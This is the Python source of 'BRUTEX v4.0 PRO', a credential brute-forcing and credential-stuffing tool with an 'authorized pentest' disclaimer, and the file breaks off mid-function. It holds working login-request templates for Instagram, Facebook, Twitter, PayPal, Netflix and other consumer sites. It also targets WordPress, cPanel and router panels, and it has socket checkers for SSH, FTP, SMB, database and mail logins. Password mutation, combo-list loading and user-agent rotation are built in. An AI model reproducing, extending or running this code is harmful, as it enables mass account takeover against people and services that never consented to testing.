# ═══════════════════════════════════════════════════════════════════════════                                                                   #  ██╗   ██╗   BRUTEX v4.0 PRO  —  Multi-Platform Credential Validator
#  ╚═╝   ╚═╝   Authorized Pentest Edition   (upgrade of SocialStrike v3.0)
# ═══════════════════════════════════════════════════════════════════════════
#  NEW IN v4.0:                                                         #   • Interactive MENU system — no CLI knowledge required
#   • 35+ platforms: 22 web (social/email/CMS/routers) + 13 network services
#   • Smart mode: password mutations (years, leet, case) built in       #   • Config save/load (brutex_config.json) + JSON/TXT reports
#   • Rainbow banner, live stats bar, boxed summary
#  REQS  : pip install requests colorama
#  OPT   : paramiko (ssh)  pymysql (mysql)  pg8000 (postgres)  pymongo (mongo)
#  NOTE  : Authorized testing ONLY. You are responsible for lawful use.
# ═══════════════════════════════════════════════════════════════════════════

import os, sys, time, random, threading, queue, argparse, json, re, socket, ssl, base64, hashlib, struct
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("[!] Missing dependency. Run: pip install requests")
    sys.exit(1)

try:
    from colorama import init, Fore, Style, Back
    init(autoreset=True)
    HAS_COLORAMA = True
except ImportError:
    HAS_COLORAMA = False

if HAS_COLORAMA:
    R, G, Y, B, M, C = Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN
    W, GR, BD, DM, X = Fore.WHITE, Fore.LIGHTBLACK_EX, Style.BRIGHT, Style.DIM, Style.RESET_ALL
else:
    R = G = Y = B = M = C = W = GR = ""
    BD = DM = ""
    X = "\033[0m"

# Optional network libraries (loaded lazily at runtime)
OPT = {"paramiko": False, "pymysql": False, "pg8000": False, "pymongo": False, "ldap3": False}
try:
    import paramiko; OPT["paramiko"] = True
except ImportError: pass
try:
    import pymysql; OPT["pymysql"] = True
except ImportError: pass
try:
    import pg8000; OPT["pg8000"] = True
except ImportError: pass
try:
    import pymongo; OPT["pymongo"] = True
except ImportError: pass
try:
    import ldap3; OPT["ldap3"] = True
except ImportError: pass

APP_VERSION = "4.0"
APP_TAGLINE = "Multi-Platform Credential Validator - Authorized Pentest Edition"

# ═══════════════════════════════════════════ BANNER ═══════════════════════════
LOGO = [
    "██████╗ ██████╗ ██╗   ██╗████████╗███████╗██╗  ██╗",
    "██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝╚██╗██╔╝",
    "██████╔╝██████╔╝██║   ██║   ██║   █████╗   ╚███╔╝ ",
    "██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝   ██╔██╗ ",
    "██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██╔╝ ██╗",
    "╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝",
    "    Author: Imin   Telegram: t.me/script_ill",
    "     Github: https://github.com/script-ill",
]
RAINBOW = [R, Y, G, C, B, M, Y, C]
RULE = f"{GR}═" * 72 + X
WIDE = 72


def banner():
    out = []
    out.append(RULE)
    pal = RAINBOW
    for i, line in enumerate(LOGO):
        out.append(f"{pal[i % 6]}{BD}{line}{X}")
    out.append(RULE)
    out.append(f"{W}{BD}  BRUTEX v{APP_VERSION} PRO{X}   {C}{APP_TAGLINE}{X}")
    out.append(f"  {G}▸ 35+ platforms{X}   {B}▸ Web + Network engines{X}   {M}▸ Menu-driven UI{X}   {Y}▸ Smart mutations{X}")
    out.append(f"  {GR}  social | email | cms | routers | ftp/ssh/db | mail | misc services{X}")
    out.append(RULE)
    out.append(f"  {R}{BD}[!]{X} {Y}AUTHORIZED PENTEST ONLY{X} {GR}-- you are responsible for complying with applicable laws.{X}")
    out.append(RULE)
    print("\n".join(out))


# ═══════════════════════════════════════ GLOBAL STATS ════════════════════════
class ProgressStats:
    def __init__(self, total=0):
        self.lock = threading.Lock()
        self.tried = self.hits = self.fails = self.errors = self.lockouts = 0
        self.total = total
        self.start = time.time()

    def record(self, result):
        with self.lock:
            self.tried += 1
            if result == "hit":   self.hits += 1
            elif result == "lock": self.lockouts += 1
            elif result == "err": self.errors += 1
            else:                  self.fails += 1

    def snapshot(self):
        with self.lock:
            el = max(time.time() - self.start, 0.001)
            return {"tried": self.tried, "hits": self.hits, "fails": self.fails,
                    "errors": self.errors, "lockouts": self.lockouts,
                    "rps": self.tried / el, "elapsed": el, "total": self.total}


# ═══════════════════════════════════════ CONFIG ══════════════════════════════
CONFIG_FILE = "brutex_config.json"
DEFAULTS = {
    "platform": None, "host": None, "port": None,
    "mode": "single",            # single | combo | matrix
    "user": None, "userlist": None, "passlist": None, "combo": None,
    "threads": 25, "delay": 0.0, "timeout": 25,
    "proxy_file": None, "stop_on_hit": False, "smart": False,
}
CFG = dict(DEFAULTS)


def save_config():
    try:
        with open(CONFIG_FILE, "w") as f:
            json.dump(CFG, f, indent=2)
        return True
    except Exception:
        return False


def load_config():
    global CFG
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE) as f:
                loaded = json.load(f)
            CFG.update(loaded)
            return True
    except Exception:
        pass
    return False


# ═══════════════════════════════════ WEB PLATFORM REGISTRY ═══════════════════
# Each entry:  kind, url, csrf_url (None=no csrf), regex (or "header:NAME"),
#              headers, form(u,p,c)->payload, ok/bad/lock substring-or-status tuples,
#              json (send as JSON body), noredir (no auto redirects),
#              hosted (url uses {HOST} placeholder), referer.
PLATFORMS = {}


def W(name, url, csrf_url=None, regex=r'name="csrf_token"\s+value="([^"]+)"',
       headers=None, form=None, ok=(), bad=(), lock=(), method="POST",
       json_body=False, noredir=False, hosted=False, referer=None, csrf_req=True):
    PLATFORMS[name] = dict(
        kind="web", name=name, url=url, csrf_url=csrf_url or url, regex=regex,
        headers=headers or {}, form=form or (lambda u, p, c: {"username": u, "password": p}),
        ok=ok, bad=bad, lock=lock, method=method, json=json_body,
        noredir=noredir, hosted=hosted, referer=referer or url, csrf_req=csrf_req)


# ── SOCIAL ────────────────────────────────────────────────────────────────────
W("instagram",
  "https://www.instagram.com/api/v1/web/accounts/login/ajax/",
  csrf_url="https://www.instagram.com/accounts/login/",
  regex=r'csrf_token["\'\s:=]+"?([a-zA-Z0-9_\-]+)"?',
  headers={"X-Requested-With": "XMLHttpRequest", "X-IG-App-ID": "936619743392459",
           "Content-Type": "application/x-www-form-urlencoded"},
  form=lambda u, p, c: {"username": u,
                        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{p}",
                        "queryParams": "{}", "optIntoOneTap": "false"},
  ok=('"authenticated":true',),
  bad=('"authenticated":false', '"message":"invalid', '"checkpoint_required"'),
  lock=('checkpoint_url', 'two_factor_required', 'rate_limit'),
  referer="https://www.instagram.com/accounts/login/")

W("facebook",
  "https://mbasic.facebook.com/login/device-based/login/async/",
  csrf_url="https://mbasic.facebook.com/login/",
  regex=r'name="fb_dtsg"\s+value="([^"]+)"',
  headers={"Content-Type": "application/x-www-form-urlencoded"},
  form=lambda u, p, c: {"email": u, "pass": p, "login": "Log In",
                        "fb_dtsg": c or "", "lsd": "AVq0xuIq_4E"},
  ok=('c_user', 'save-device', 'm_ts'),
  bad=('login_error', 'Wrong credentials', 'incorrect'),
  lock=('checkpoint', 'approvals_code', 'too many'),
  referer="https://mbasic.facebook.com/")

W("twitter",
  "https://api.twitter.com/i/api/1.1/onboarding/task.json?task=login",
  csrf_url="https://twitter.com/",
  regex=r'ct0["\']?\s*[:=]\s*["\']([a-zA-Z0-9_\-]+)',
  headers={"Authorization": "Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA",
           "Content-Type": "application/json", "X-Twitter-Auth-Type": "OAuth2Session",
           "X-Twitter-Client-Language": "en"},
  form=lambda u, p, c: json.dumps({"flow_token": None, "subtask_inputs": [{
      "subtask_id": "LoginEnterUserIdentifier",
      "settings_list": {"setting_responses": [{
          "key": "user_identifier", "response_data": {"text_data": {"result": u}}}],
          "link": "next_link"}}]}),
  ok=('subtasks',),
  bad=('"errors"', 'code":399'),
  lock=(429, 'rate_limit'),
  referer="https://twitter.com/i/flow/login")

W("linkedin",
  "https://www.linkedin.com/uas/login-submit",
  csrf_url="https://www.linkedin.com/login",
  regex=r'csrfToken["\']?\s*[:=]\s*["\']([a-zA-Z0-9_\-]+)',
  form=lambda u, p, c: {"session_key": u, "session_password": p,
                        "isJsEnabled": "false", "loginCsrfParam": c or ""},
  ok=('feed', 'checkpoint/basic'),
  bad=('incorrect', 'not registered', 'authwall'),
  lock=('captcha', 'restrict', 'challenge'),
  referer="https://www.linkedin.com/login")

W("reddit",
  "https://www.reddit.com/api/login",
  csrf_url="https://www.reddit.com/login",
  regex=r'csrf_token["\'\s:=]+"?([a-zA-Z0-9_\-]+)"?',
  form=lambda u, p, c: {"user": u, "passwd": p, "api_type": "json", "op": "login"},
  ok=('"errors":[]',),
  bad=('WRONG_PASSWORD', 'USER_BLOCKED'),
  lock=(429, 'RATELIMIT'))

W("tiktok",
  "https://www.tiktok.com/api/passport/web/login/",
  csrf_url=None,
  headers={"Content-Type": "application/x-www-form-urlencoded"},
  form=lambda u, p, c: {"username": u, "password": p, "aid": "1459",
                        "service": "https://www.tiktok.com", "source": "web",
                        "app_name": "tiktok_web"},
  ok=('"error_code":0',),
  bad=(),
  lock=('captcha', 'verify'),
  referer="https://www.tiktok.com/login")

W("snapchat",
  "https://accounts.snapchat.com/accounts/login",
  csrf_url="https://accounts.snapchat.com/accounts/login",
  regex=r'name="csrf_token"\s+value="([^"]+)"',
  form=lambda u, p, c: {"username": u, "password": p, "rememberMe": "true"},
  ok=('logged-in', 'setSession'),
  bad=('incorrect', 'Invalid'),
  lock=('verify', 'locked', 'captcha'))

W("github",
  "https://github.com/session",
  csrf_url="https://github.com/login",
  regex=r'name="authenticity_token"\s+value="([^"]+)"',
  headers={"Content-Type": "application/x-www-form-urlencoded"},
  form=lambda u, p, c: {"login": u, "password": p, "authenticity_token": c or "",
                        "commit": "Sign in"},
  ok=('logged_in', 'dashboard'),
  bad=('Incorrect username or password', 'Invalid login'),
  lock=('captcha', 'too many'),
  referer="https://github.com/login")

W("pinterest",
  "https://www.pinterest.com/resource/UserSessionResource/create/",
  csrf_url="https://www.pinterest.com/login/",
  regex=r'"csrfToken"\s*:\s*"([^"]+)"',
  headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
           "X-Requested-With": "XMLHttpRequest"},
  form=lambda u, p, c: {"source_url": "/login/",
                        "data": json.dumps({"options": {"username_or_email": u, "password": p},
                                            "context": {}})},
  ok=('sessionId', '"type":"success"'),
  bad=('"type":"error"', 'invalid'),
  lock=('captcha', 'rate_limit'))

# ── EMAIL / ACCOUNTS ──────────────────────────────────────────────────────────
W("ebay",
  "https://signin.ebay.com/ws/eBayISAPI.dll",
  csrf_url="https://signin.ebay.com/ws/eBayISAPI.dll?SignIn&ru=",
  regex=r'name="srt"\s+value="([^"]+)"',
  headers={"Content-Type": "application/x-www-form-urlencoded"},
  form=lambda u, p, c: {"userid": u, "pass": p, "srt": c or "", "ru": ""},
  ok=(302,),
  bad=('password you entered is incorrect', 'Incorrect user ID'),
  lock=('captcha', 'too many'),
  noredir=True)

W("netflix",
  "https://www.netflix.com/login",
  csrf_url="https://www.netflix.com/login",
  regex=r'<input[^>]*name="authURL"[^>]*value="([^"]+)"',
  headers={"Content-Type": "application/x-www-form-urlencoded"},
  form=lambda u, p, c: {"userLoginId": u, "password": p, "authURL": c or "",
                        "countryCode": "US", "locale": "en-US"},
  ok=('browse', 'Your Account'),
  bad=('Incorrect password', "can't find an account"),
  lock=('too many', 'captcha'))

W("spotify",
  "https://accounts.spotify.com/en/login",
  csrf_url="https://accounts.spotify.com/en/login",
  regex=r'name="csrf_token"\s+value="([^"]+)"',
  headers={"Content-Type": "application/x-www-form-urlencoded"},
  form=lambda u, p, c: {"username": u, "password": p, "csrf_token": c or "", "remember": "true"},
  ok=('access_token', 'spotify.com/'),
  bad=('Incorrect username or password', 'That email'),
  lock=('captcha', 'try again later'))

W("paypal",
  "https://www.paypal.com/signin",
  csrf_url="https://www.paypal.com/signin",
  regex=r'"csrfToken"\s*:\s*"([^"]+)"',
  headers={"Content-Type": "application/x-www-form-urlencoded"},
  form=lambda u, p, c: {"login_email": u, "login_password": p, "csrf_token": c or ""},
  ok=('myaccount', 'business'),
  bad=('incorrect', 'unable to log'),
  lock=('captcha', 'temporarily locked'))

W("roblox",
  "https://auth.roblox.com/v2/login",
  csrf_url="https://auth.roblox.com/v2/login",
  regex="header:X-CSRF-TOKEN",
  headers={"Content-Type": "application/json"},
  form=lambda u, p, c: json.dumps({"ctype": "Username", "cvalue": u, "password": p,
                                   "captchaId": "", "captchaToken": "", "captchaProvider": ""}),
  ok=('"code":0',),
  bad=('"errors"',),
  lock=(429, 'too many', 'captcha'),
  json_body=True)

# ── SELF-HOSTED (CMS / PANELS / ROUTERS)  —  {HOST} = target URL from menu ────
W("wordpress",
  "https://{HOST}/wp-login.php",
  csrf_url=None,
  headers={"Content-Type": "application/x-www-form-urlencoded"},
  form=lambda u, p, c: {"log": u, "pwd": p, "wp-submit": "Log In",
                        "redirect_to": "https://{HOST}/wp-admin/", "testcookie": "1"},
  ok=('wp-admin', 'wordpress_logged_in'),
  bad=('ERROR: Incorrect', 'ERROR: Invalid', 'ERROR: The password'),
  lock=('too many failed', 'locked'),
  hosted=True)

W("drupal",
  "https://{HOST}/user/login",
  csrf_url="https://{HOST}/user/login",
  regex=r'name="form_build_id"\s+value="([^"]+)"',
  headers={"Content-Type": "application/x-www-form-urlencoded"},
  form=lambda u, p, c: {"name": u, "pass": p, "form_id": "user_login_form",
                        "form_build_id": c or "", "op": "Log in"},
  ok=('Log out', 'Welcome'),
  bad=('Unrecognized username', 'Sorry, unrecognized'),
  lock=('too many'),
  hosted=True)


def _joomla_form(u, p, c):
    d = {"username": u, "passwd": p, "option": "com_login", "task": "login",
         "return": "aW5kZXgucGhw"}
    if c:
        d[c] = "1"
    return d


W("joomla",
  "https://{HOST}/administrator/index.php",
  csrf_url="https://{HOST}/administrator/index.php",
  regex=r'name="([a-f0-9]{32})"\s+value="1"',
  headers={"Content-Type": "application/x-www-form-urlencoded"},
  form=_joomla_form,
  ok=('control panel', 'logout'),
  bad=('Invalid username', 'There was a problem'),
  lock=(),
  hosted=True)

W("cpanel",
  "https://{HOST}:2083/login/?login_only=1",
  csrf_url=None,
  headers={"Content-Type": "application/json"},
  form=lambda u, p, c: json.dumps({"user": u, "pass": p}),
  ok=('security_token',),
  bad=('"status":0', 'errors'),
  lock=('too many', 'locked'),
  json_body=True,
  hosted=True)

W("nextcloud",
  "https://{HOST}/login",
  csrf_url="https://{HOST}/login",
  regex=r'name="requesttoken"\s+value="([^"]+)"',
  headers={"Content-Type": "application/x-www-form-urlencoded"},
  form=lambda u, p, c: {"user": u, "password": p, "requesttoken": c or ""},
  ok=('apps/files', 'user_status'),
  bad=('Wrong password', 'Invalid password'),
  lock=('too many'),
  hosted=True)

W("phpmyadmin",
  "https://{HOST}/index.php",
  csrf_url="https://{HOST}/index.php",
  regex=r'name="token"\s+value="([^"]+)"',
  headers={"Content-Type": "application/x-www-form-urlencoded"},
  form=lambda u, p, c: {"pma_username": u, "pma_password": p, "server": "1",
                        "target": "index.php", "token": c or ""},
  ok=(302,),
  bad=('#1045', 'Access denied', 'Cannot log in'),
  lock=('too many'),
  noredir=True,
  hosted=True)

W("mikrotik",
  "http://{HOST}/login",
  csrf_url="http://{HOST}/",
  regex=r'name="([a-f0-9]{20,40})"\s+value=""',
  headers={"Content-Type": "application/x-www-form-urlencoded"},
  form=lambda u, p, c: {"username": u, "password": p},
  ok=('logged', 'SID'),
  bad=('error', 'does not exist'),
  lock=('blocked', 'too many'),
  hosted=True)

W("pfsense",
  "https://{HOST}/index.php",
  csrf_url="https://{HOST}/",
  regex=r'name="__csrf_magic"\s+value="([^"]+)"',
  headers={"Content-Type": "application/x-www-form-urlencoded"},
  form=lambda u, p, c: {"__csrf_magic": c or "", "usernamefld": u,
                        "passwordfld": p, "login": "Sign In"},
  ok=('diag', 'status_log'),
  bad=('Username or Password incorrect', 'expired'),
  lock=('captcha', 'temporarily blocked'),
  hosted=True)

# Platforms that are heavily bot-protected or version-dependent: results vary.
EXPERIMENTAL = {"netflix", "paypal", "snapchat", "mikrotik", "drupal", "joomla"}


from urllib.parse import quote

try:
    from Crypto.Cipher import DES, AES
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

# ── Socket helpers ────────────────────────────────────────────────────────────
def _sock(host, port, timeout):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((host, port))
    return s


def _recv(s, until=None, timeout=5):
    s.settimeout(timeout)
    buf = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            buf += chunk
            if until and until in buf:
                break
    except socket.timeout:
        pass
    except OSError:
        pass
    return buf


def _tls_wrap(s, host):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx.wrap_socket(s, server_hostname=host)


# ── Protocol checkers:  check(host, port, user, pw, timeout, tls) -> (result, info) ──
def chk_ftp(host, port, user, pw, timeout, tls):
    try:
        s = _sock(host, port, timeout)
        b = _recv(s, b"220", timeout)
        s.sendall(f"USER {user}\r\n".encode()); b = _recv(s, b"331", timeout)
        s.sendall(f"PASS {pw}\r\n".encode());     b = _recv(s, timeout=4)
        s.sendall(b"QUIT\r\n"); s.close()
        if b"230" in b: return "hit", "logged in"
        if b"530" in b: return "fail", "bad creds"
        if b"421" in b or b"429" in b: return "lock", "rate limited"
        return "fail", b.decode(errors="replace").strip()[:50]
    except Exception as e:
        return "err", str(e)[:60]


def chk_ssh(host, port, user, pw, timeout, tls):
    if not OPT["paramiko"]:
        return "err", "pip install paramiko"
    try:
        cli = paramiko.SSHClient()
        cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        cli.connect(host, port=port, username=user, password=pw,
                    timeout=timeout, banner_timeout=timeout, auth_timeout=timeout,
                    allow_agent=False, look_for_keys=False)
        cli.close()
        return "hit", "authenticated"
    except paramiko.AuthenticationException:
        return "fail", "bad creds"
    except Exception as e:
        return "err", str(e)[:60]


def chk_telnet(host, port, user, pw, timeout, tls):
    try:
        s = _sock(host, port, timeout)
        b = _recv(s, b"login:", timeout)
        s.sendall(user.encode() + b"\r\n"); b = _recv(s, b"Password:", timeout)
        s.sendall(pw.encode() + b"\r\n")
        time.sleep(0.6)
        b = _recv(s, timeout=2)
        s.close()
        low = b.lower()
        if b"login incorrect" in low or b"incorrect" in low:
            return "fail", "bad creds"
        if b"$" in b or b"#" in b or b">" in b or b"%" in b:
            return "hit", "shell obtained"
        return "fail", "prompt not detected"
    except Exception as e:
        return "err", str(e)[:60]


def chk_smtp(host, port, user, pw, timeout, tls):
    try:
        s = _sock(host, port, timeout)
        if tls: s = _tls_wrap(s, host)
        b = _recv(s, b"220", timeout)
        s.sendall(b"EHLO brutex.local\r\n"); b = _recv(s, b"250", timeout)
        s.sendall(b"AUTH LOGIN\r\n");        b = _recv(s, b"334", timeout)
        s.sendall(base64.b64encode(user.encode()) + b"\r\n"); b = _recv(s, b"334", timeout)
        s.sendall(base64.b64encode(pw.encode()) + b"\r\n");  b = _recv(s, timeout=4)
        s.sendall(b"QUIT\r\n"); s.close()
        if b"235" in b: return "hit", "authenticated"
        if b"535" in b or b"503" in b: return "fail", "bad creds"
        return "fail", b.decode(errors="replace").strip()[:50]
    except Exception as e:
        return "err", str(e)[:60]


def chk_pop3(host, port, user, pw, timeout, tls):
    try:
        s = _sock(host, port, timeout)
        if tls: s = _tls_wrap(s, host)
        b = _recv(s, b"+OK", timeout)
        s.sendall(f"USER {user}\r\n".encode()); b = _recv(s, b"+OK", timeout)
        s.sendall(f"PASS {pw}\r\n".encode());   b = _recv(s, timeout=4)
        s.sendall(b"QUIT\r\n"); s.close()
        if b.startswith(b"+OK"): return "hit", "authenticated"
        if b.startswith(b"-ERR"): return "fail", "bad creds"
        return "fail", b.decode(errors="replace").strip()[:50]
    except Exception as e:
        return "err", str(e)[:60]


def chk_imap(host, port, user, pw, timeout, tls):
    try:
        s = _sock(host, port, timeout)
        if tls: s = _tls_wrap(s, host)
        b = _recv(s, b"OK", timeout)
        s.sendall(f"A1 LOGIN {quote(user)} {quote(pw)}\r\n".encode())
        b = _recv(s, timeout=5)
        s.sendall(b"A2 LOGOUT\r\n"); s.close()
        if b"A1 OK" in b: return "hit", "authenticated"
        if b"A1 NO" in b or b"A1 BAD" in b: return "fail", "bad creds"
        return "fail", b.decode(errors="replace").strip()[:50]
    except Exception as e:
        return "err", str(e)[:60]


def chk_mysql(host, port, user, pw, timeout, tls):
    if not OPT["pymysql"]:
        return "err", "pip install pymysql"
    try:
        conn = pymysql.connect(host=host, port=port, user=user, password=pw,
                               connect_timeout=timeout)
        conn.close()
        return "hit", "authenticated"
    except pymysql.err.OperationalError as e:
        return ("fail", "bad creds") if "Access denied" in str(e) else ("err", str(e)[:60])
    except Exception as e:
        return "err", str(e)[:60]


def chk_postgres(host, port, user, pw, timeout, tls):
    if not OPT["pg8000"]:
        return "err", "pip install pg8000"
    try:
        conn = pg8000.connect(host=host, port=port, user=user, password=pw,
                              timeout=timeout)
        conn.close()
        return "hit", "authenticated"
    except Exception as e:
        m = str(e)
        if "password" in m.lower() or "authentication" in m.lower():
            return "fail", "bad creds"
        return "err", m[:60]


def chk_mongo(host, port, user, pw, timeout, tls):
    if not OPT["pymongo"]:
        return "err", "pip install pymongo"
    try:
        uri = (f"mongodb://{quote(user)}:{quote(pw)}@{host}:{port}/admin"
               f"?authSource=admin&connectTimeoutMS={int(timeout*1000)}"
               f"&serverSelectionTimeoutMS={int(timeout*1000)}")
        cli = pymongo.MongoClient(uri, serverSelectionTimeoutMS=int(timeout * 1000))
        cli.admin.command("ping")
        cli.close()
        return "hit", "authenticated"
    except pymongo.errors.OperationFailure:
        return "fail", "bad creds"
    except Exception as e:
        return "err", str(e)[:60]


def chk_redis(host, port, user, pw, timeout, tls):
    try:
        s = _sock(host, port, timeout)
        if tls: s = _tls_wrap(s, host)
        s.sendall(b"*1\r\n$5\r\nRESET\r\n"); _recv(s, b"+OK", timeout)
        s.sendall(f"*2\r\n$4\r\nAUTH\r\n${len(pw)}\r\n{pw}\r\n".encode())
        b = _recv(s, timeout=4)
        s.close()
        if b"+OK" in b: return "hit", "authenticated"
        if b"WRONGPASS" in b or b"ERR invalid password" in b: return "fail", "bad creds"
        return "fail", b.decode(errors="replace").strip()[:50]
    except Exception as e:
        return "err", str(e)[:60]


def chk_vnc(host, port, user, pw, timeout, tls):
    try:
        s = _sock(host, port, timeout)
        b = _recv(s, b"\n", timeout)
        if not b.startswith(b"RFB "):
            s.close(); return "fail", "not a VNC server"
        s.sendall(b"RFB 003.008\n")
        sec = _recv(s, timeout=3)
        if sec == b"\x00":                      # >255 security types
            sec = _recv(s, timeout=2)
        if b"\x02" not in sec:
            s.close(); return "fail", "VNC auth not offered"
        s.sendall(b"\x02")
        chal = _recv(s, timeout=3)
        if len(chal) < 16:
            s.close(); return "fail", "no challenge received"
        if not HAS_CRYPTO:
            s.close(); return "err", "pip install pycryptodome (VNC needs DES)"
        from Crypto.Cipher import DES
        key = pw[:8].ljust(8, "\x00").encode("latin1")
        key = bytes([int(f"{x:08b}"[::-1], 2) for x in key])   # VNC byte-flip
        s.sendall(DES.new(key, DES.MODE_ECB).encrypt(chal[:16]))
        b = _recv(s, timeout=3)
        s.close()
        if b[:4] == b"\x00\x00\x00\x00": return "hit", "authenticated"
        return "fail", "auth failed"
    except Exception as e:
        return "err", str(e)[:60]


def chk_smb(host, port, user, pw, timeout, tls):
    try:
        from impacket.smbconnection import SMBConnection
    except ImportError:
        return "err", "pip install impacket"
    try:
        conn = SMBConnection(user, pw, "", host, port=port, timeout=timeout)
        conn.logoff()
        return "hit", "authenticated"
    except Exception as e:
        m = str(e)
        if "STATUS_LOGON_FAILURE" in m or "STATUS_ACCESS_DENIED" in m:
            return "fail", "bad creds"
        if "STATUS_ACCOUNT" in m: return "lock", m[:50]
        return "err", m[:60]


def chk_ldap(host, port, user, pw, timeout, tls):
    if not OPT["ldap3"]:
        return "err", "pip install ldap3"
    try:
        from ldap3 import Server, Connection, ALL
        srv = Server(host, port=port, get_info=ALL, use_ssl=tls, connect_timeout=timeout)
        conn = Connection(srv, user=user, password=pw, receive_timeout=timeout,
                          authentication="SIMPLE")
        ok = conn.bind()
        conn.unbind()
        return ("hit", "authenticated") if ok else ("fail", "bad creds")
    except Exception as e:
        m = str(e)
        if "invalidCredentials" in m or "data 49" in m: return "fail", "bad creds"
        return "err", m[:60]


# ── Network registry ──────────────────────────────────────────────────────────
NETPLATFORMS = {}


def N(name, port, check, tls=False, user=True):
    NETPLATFORMS[name] = dict(kind="net", name=name, port=port, check=check,
                              default_tls=tls, needs_user=user)


N("ftp",      21,   chk_ftp)
N("ssh",      22,   chk_ssh)
N("telnet",   23,   chk_telnet)
N("smtp",     25,   chk_smtp)
N("smtps",    465,  chk_smtp, tls=True)
N("pop3",     110,  chk_pop3)
N("pop3s",    995,  chk_pop3, tls=True)
N("imap",     143,  chk_imap)
N("imaps",    993,  chk_imap, tls=True)
N("mysql",    3306, chk_mysql)
N("postgres", 5432, chk_postgres)
N("mongodb",  27017, chk_mongo)
N("redis",    6379, chk_redis, user=False)
N("vnc",      5900, chk_vnc)
N("smb",      445,  chk_smb)
N("ldap",     389,  chk_ldap)
N("ldaps",    636,  chk_ldap, tls=True)


# ── Smart password mutations ──────────────────────────────────────────────────
def smart_passwords(base, max_extra=10):
    """Expand one password into mutation variants (years, symbols, leet, case)."""
    out = [base]
    if not base:
        return out
    v = []
    for y in ("2024", "2025", "2026", "2027"):
        v += [base + y, base + "@" + y, base + "!" + y]
    for s in ("!", "@", "#", "$", "123", "1234", "12345", "1", "69", "007"):
        v += [base + s, s + base]
    v += [base.capitalize(), base.upper(), base + str(len(base))]
    leet = base.replace("a", "@").replace("e", "3").replace("i", "1") \
               .replace("o", "0").replace("s", "$")
    if leet != base:
        v.append(leet)
    for cand in v:
        if cand not in out:
            out.append(cand)
        if len(out) >= max_extra:
            break
    return out


# ── Credential loader ─────────────────────────────────────────────────────────
def _read_lines(path):
    try:
        with open(path, errors="replace") as f:
            return [l.strip() for l in f if l.strip()]
    except OSError as e:
        print(f"{R}[!] Cannot read {path}: {e}{X}")
        return []


def load_pairs(cfg):
    """Build (user, pass) pairs from config. Modes: combo | matrix | single."""
    pairs = []
    combo = cfg.get("combo")
    if combo:
        for line in _read_lines(combo):
            if ":" in line:
                u, p = line.split(":", 1)
                pairs.append((u.strip(), p.strip()))
    elif cfg.get("userlist") and cfg.get("passlist"):
        users = _read_lines(cfg["userlist"])
        pwds = _read_lines(cfg["passlist"])
        for u in users:
            for p in pwds:
                pairs.append((u, p))
    elif cfg.get("user") and cfg.get("passlist"):
        u = cfg["user"]
        for p in _read_lines(cfg["passlist"]):
            pairs.append((u, p))
    else:
        return []

    if cfg.get("smart"):
        expanded = []
        for u, p in pairs:
            for v in smart_passwords(p):
                expanded.append((u, v))
        pairs = expanded
    return pairs

# ═══════════════════════════════════════════════════════════════════════════

import glob

ANSI_RE = re.compile(r"\x1b\[[0-9;]*m")
def _vis(s): return ANSI_RE.sub("", s)

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
]

# ── BOX / UI helpers ─────────────────────────────────────────────────────────
def box(title, lines, color=C):
    w = max([len(_vis(l)) for l in lines] + [len(title)]) + 4
    w = max(w, 46)
    out = [f"{color}┌{'─' * (w - 2)}┐{X}"]
    out.append(f"{color}│{X} {BD}{title:<{w - 4}}{X} {color}│{X}")
    out.append(f"{color}├{'─' * (w - 2)}┤{X}")
    for l in lines:
        out.append(f"{color}│{X} {l:<{w - 4}} {color}│{X}")
    out.append(f"{color}└{'─' * (w - 2)}┘{X}")
    return "\n".join(out)


def _ask(prompt, default=None):
